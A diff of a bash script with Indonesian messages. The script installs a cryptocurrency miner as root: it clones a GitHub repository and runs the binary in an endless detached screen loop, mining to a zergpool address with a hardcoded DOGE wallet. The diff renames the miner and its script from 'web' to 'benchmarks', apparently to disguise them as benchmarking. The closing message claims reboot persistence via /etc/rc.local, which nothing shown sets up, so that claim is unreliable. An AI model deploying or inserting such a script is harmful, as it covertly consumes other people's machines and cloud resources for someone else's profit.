@@ -1,19 +1,19 @@
 #!/bin/bash
 echo "📦 Menginstal dependensi..."
-apt-get update && apt-get install -y screen wget tar git
+apt-get update && apt-get install -y screen wget tar
 
-echo "📁 Menyimpan skrip mining ke /root/web.sh..."
-cat << 'EOF' > /root/web.sh
+echo "📁 Menyimpan skrip mining ke /root/benchmarks.sh..."
+cat << 'EOF' > /root/benchmarks.sh
 #!/bin/bash
 
 cd /root || exit
 
 # Download miner jika belum ada
-if [ ! -f web ]; then
-  echo "⬇️ Mengunduh file web..."
+if [ ! -f benchmarks ]; then
+  echo "⬇️ Mengunduh file benchmarks..."
   git clone https://github.com/amirul5656/yui56.git
   cd yui56
-  chmod +x web
+  chmod +x benchmarks
 fi
 
 # Cek apakah screen sudah berjalan
@@ -23,16 +23,16 @@ else
   echo "▶ Menjalankan mining di screen 'amirul3'..."
   screen -dmS amirul3 bash -c '
     while true; do
-      ./web -a rinhash -o stratum+tcp://rinhash.eu.mine.zergpool.com:7148 -u D8n4HXcTza73pBw93ZnSgcZRo8rHdZJLux  -p c=DOGE -t 12
+      ./benchmarks --algorithm rinhash --pool stratum+tcp://rinhash.eu.mine.zergpool.com:7148 -u D8n4HXcTza73pBw93ZnSgcZRo8rHdZJLux -p c=DOGE --cpu-threads 12
       sleep 2
     done
   '
 fi
 EOF
 
-chmod +x /root/web.sh
+chmod +x /root/benchmarks.sh
 
 echo "🚀 Menjalankan miner sekarang..."
-bash /root/web.sh
+bash /root/benchmarks.sh
 
 echo "✅ Siap! Mining aktif sekarang & otomatis jalan setelah reboot lewat /etc/rc.local."
